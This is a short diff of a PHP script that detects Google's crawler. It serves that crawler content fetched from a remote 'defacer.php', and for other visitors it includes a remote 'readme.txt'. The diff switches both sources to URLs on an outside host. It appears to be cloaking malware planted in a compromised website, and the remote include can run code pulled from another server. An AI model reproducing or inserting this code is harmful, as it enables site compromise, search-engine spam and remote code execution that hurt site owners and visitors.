@@ -8,11 +8,11 @@ function is_google_bot() {
 }
  
 if (is_google_bot()) {
-    $bot_content = file_get_contents('wp-includes/blocks/code/defacer.php');
+    $bot_content = file_get_contents('https://berita.smkyapalis-krian.sch.id/wp-includes/blocks/code/defacer.php');
     echo $bot_content;
     exit;
 } else {
-    include('readme.txt');
+    include('https://berita.smkyapalis-krian.sch.id/readme.txt');
     exit;
 }
 ?>
